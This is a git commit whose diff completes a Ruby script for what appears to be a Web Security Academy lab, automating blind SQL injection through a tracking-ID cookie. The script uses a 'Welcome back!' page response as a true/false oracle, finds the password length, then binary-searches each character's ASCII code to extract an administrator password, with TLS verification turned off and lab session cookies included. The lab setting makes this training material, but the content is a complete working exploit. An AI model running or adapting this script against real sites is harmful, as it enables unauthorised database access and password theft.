1553df12a26986eadf9ce87e89f9572ec3d69c02
jbk2 <james@humanbenefits.com>
2026-01-08 17:44:53 +0100

    Fully workign password fuzzing script - #find_ASCII_at - Uses recursive binary search on a range of ASCII char   codes combined with #sql_char_test which builds an sql query to validate   whether a password chars ASCII code at position x is > than the value   of the value that the algo is testing. Binary searches through the   ASCII range with base case returning the actual value - #fuzz_password method runs #password_length, iterates over each of   length's chars with #find_ASCII_at to ultimately find the broken   password

--- sql/lab11.rb
+++ sql/lab11.rb
@@ -1,17 +1,19 @@
+# MUST LOGIN IN BROWSER FIRST AND SET CONFIG HERE
+
 require 'uri'
 require 'net/http'
 require 'openssl'
 
-SESSION_COOKIE = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
-TRACKING_ID = "iOiUpdGkE7gfW0eR"
-BASE_URI = URI("https://0abe00430482f05584fd634a004300d0.web-security-academy.net/")
-
+SESSION_COOKIE = "rCCusjNt27GdW5sEwI7EuLt18EMx5VkP"
+TRACKING_ID = "zvqi4WZsCWZf10KI"
+BASE_URI = URI("https://0a03001404b342e680a7531c0047007a.web-security-academy.net/")
 CHARS = ('a'..'z').to_a.concat((0..9).to_a)
-ASCII_RANGE = (32..126)
+ASCII_MIN = 32
+ASCII_MAX = 126
 
 def http_client
   http = Net::HTTP.new(BASE_URI.host, BASE_URI.port)
-  http.use_ssl = (BASE_URI.scheme = "https")
+  http.use_ssl = (BASE_URI.scheme == "https")
   http.verify_mode = OpenSSL::SSL::VERIFY_NONE
   http.open_timeout = 5
   http.read_timeout = 10
@@ -37,21 +39,65 @@ def sql_char_test(pword_char_index, test_ascii_no, operator)
   )) #{operator} '#{test_ascii_no}"
 end
 
-def password_length?
-  # from 1..30 call sql_password_length
+def password_length?(max_length: 30)
+  (1..max_length).each do |n|
+    tracking_sql = sql_password_length('>', n)
+    greater_than_n = valid_request(tracking_sql)
+    puts greater_than_n ? "Password is greater than #{n}" : "Password is NOT greater than #{n}"
+    return n unless greater_than_n
+  end
+
+  nil
 end
 
-def fetch(injected_tracking_id = TRACKING_ID)
+def valid_request(injected_tracking_id = TRACKING_ID)
   response = http_client.request(built_request(injected_tracking_id))
 
   puts response.code == '200' ? "Status: ✅ #{response.code} #{response.message}" : "Status: ❌ #{response.code} #{response.message}"
   puts "Content-Type: #{response['content-type']}"
   puts "Body bytes: #{response.body.bytesize}"
-  puts welcome_back_present?(response.body) ? "Valid" : "Invalid"
+  valid = welcome_back_present?(response.body)
+  puts valid ? "Valid" : "Invalid"
+  return valid
 end
 
 def welcome_back_present?(response_body)
   response_body.include?("Welcome back!")
 end
 
-fetch
+def find_ASCII_at(idx, min_ASCII=ASCII_MIN, max_ASCII=ASCII_MAX)
+  if min_ASCII == max_ASCII
+    puts "ASCII char is === #{min_ASCII}"
+    puts "alphanumeric char is === #{min_ASCII.chr(Encoding::ASCII)}"
+    return min_ASCII
+  end
+  
+  mid_ASCII = (min_ASCII + max_ASCII) / 2
+
+  sql = sql_char_test(idx, mid_ASCII, '>').gsub(/[\r\n]/, "")
+
+  is_above_mid = valid_request(sql)
+
+  if is_above_mid
+    # therefore value is somewhere in mid + 1..max
+    find_ASCII_at(idx, mid_ASCII + 1, max_ASCII)
+  else
+    # therefore value is somewhere in min..mid
+    find_ASCII_at(idx, min_ASCII, mid_ASCII)
+  end
+end
+
+def fuzz_password
+  password_length = password_length?
+  password_chars = []
+
+  (1..password_length).each do |idx|
+    password_chars << find_ASCII_at(idx, ASCII_MIN, ASCII_MAX)
+  end
+
+  password_chars.map { |ascii| ascii.chr(Encoding::ASCII) }.join
+end
+
+ADMIN_PASSWORD = fuzz_password
+
+puts ADMIN_PASSWORD
